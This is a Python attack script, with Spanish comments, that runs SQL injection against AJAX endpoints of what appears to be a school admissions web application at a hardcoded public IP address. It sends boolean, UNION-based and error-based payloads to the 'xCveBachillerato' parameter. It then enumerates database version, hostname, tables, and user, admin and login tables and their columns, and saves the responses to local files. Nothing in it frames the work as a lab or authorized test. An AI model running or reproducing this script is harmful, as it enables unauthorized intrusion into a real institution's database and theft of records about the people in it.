import requests
import urllib3
import json

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class AjaxExploiter:
    def __init__(self, target_ip):
        self.target_ip = target_ip
        self.base_url = f"https://{target_ip}"
        self.session = requests.Session()
        self.session.verify = False

    def exploit_bachillerato_ajax(self):
        """Explota el endpoint AJAX de bachilleratos"""
        print("[*] Explotando endpoint AJAX de bachilleratos...")
        
        ajax_urls = [
            "/jsp/escolar/proceso_admision/muestra_bachillerato_ajax.jsp",
            "/jsp/escolar/muestra_bachillerato_ajax.jsp"
        ]
        
        # Payloads de SQL Injection para AJAX
        sql_payloads = [
            "1",  # Normal
            "1' OR '1'='1'--",  # SQL Injection básico
            "1 UNION SELECT 1,2,3--",  # Union based
            "1 UNION SELECT database(),user(),version()--",  # Info DB
            "1 UNION SELECT table_name,table_schema,3 FROM information_schema.tables--",  # Tablas
            "1 UNION SELECT column_name,2,3 FROM information_schema.columns WHERE table_name='users'--",  # Columnas
            "1' AND 1=CAST((SELECT version()) AS INT)--",  # Error based
        ]
        
        for ajax_url in ajax_urls:
            print(f"\n[+] Probando: {ajax_url}")
            
            for payload in sql_payloads:
                try:
                    url = f"{self.base_url}{ajax_url}?xCveBachillerato={payload}"
                    response = self.session.get(url, timeout=8)
                    
                    print(f"    Payload: {payload[:50]}...")
                    print(f"    Status: {response.status_code}, Tamaño: {len(response.text)}")
                    
                    if response.status_code == 200 and response.text.strip():
                        # Analizar la respuesta
                        if "error" in response.text.lower():
                            print("      [!] Error detectado en respuesta")
                        elif "union" in response.text.lower():
                            print("      [!] Posible ejecución de UNION")
                        elif "database" in response.text.lower():
                            print("      [!] Posible información de BD")
                        
                        # Mostrar parte de la respuesta
                        if len(response.text) > 10:
                            print(f"      Respuesta: {response.text[:200]}...")
                    
                    # Guardar respuestas interesantes
                    if "mysql" in response.text.lower() or "database" in response.text.lower():
                        filename = f"ajax_exploit_{payload.replace(' ', '_')[:20]}.txt"
                        with open(filename, 'w', encoding='utf-8') as f:
                            f.write(response.text)
                        print(f"      [+] Respuesta guardada en {filename}")
                        
                except Exception as e:
                    print(f"      [-] Error: {e}")

    def extract_data_via_ajax(self):
        """Extrae datos a través del endpoint AJAX"""
        print("\n[*] Extrayendo datos via AJAX...")
        
        # Extraer información de la base de datos
        extraction_payloads = [
            # Información del sistema
            "1 UNION SELECT @@version,@@hostname,@@datadir--",
            "1 UNION SELECT user(),database(),version()--",
            
            # Tablas del sistema
            "1 UNION SELECT table_name,table_rows,table_comment FROM information_schema.tables WHERE table_schema=database()--",
            
            # Posibles tablas de usuarios
            "1 UNION SELECT table_name,2,3 FROM information_schema.tables WHERE table_schema=database() AND table_name LIKE '%user%'--",
            "1 UNION SELECT table_name,2,3 FROM information_schema.tables WHERE table_schema=database() AND table_name LIKE '%admin%'--",
            "1 UNION SELECT table_name,2,3 FROM information_schema.tables WHERE table_schema=database() AND table_name LIKE '%login%'--",
            
            # Columnas de tablas de usuarios
            "1 UNION SELECT column_name,data_type,column_default FROM information_schema.columns WHERE table_name='usuarios'--",
        ]
        
        ajax_url = "/jsp/escolar/proceso_admision/muestra_bachillerato_ajax.jsp"
        
        for i, payload in enumerate(extraction_payloads):
            try:
                url = f"{self.base_url}{ajax_url}?xCveBachillerato={payload}"
                response = self.session.get(url, timeout=10)
                
                print(f"\n[+] Payload {i+1}: {payload[:60]}...")
                print(f"    Respuesta: {response.text[:500]}...")
                
                if response.text and "¬" in response.text or "," in response.text:
                    lines = response.text.split('\n')
                    for line in lines:
                        if line.strip() and not line.startswith('1¬'):
                            print(f"    [!] Dato extraído: {line.strip()}")
                
                # Guardar respuesta completa
                with open(f"ajax_data_extraction_{i+1}.txt", 'w', encoding='utf-8') as f:
                    f.write(response.text)
                    
            except Exception as e:
                print(f"    [-] Error: {e}")

# Ejecutar explotación AJAX
print("=== EXPLOTACIÓN ENDPOINT AJAX ===")
ajax_exploiter = AjaxExploiter("189.254.143.102")
ajax_exploiter.exploit_bachillerato_ajax()
ajax_exploiter.extract_data_via_ajax()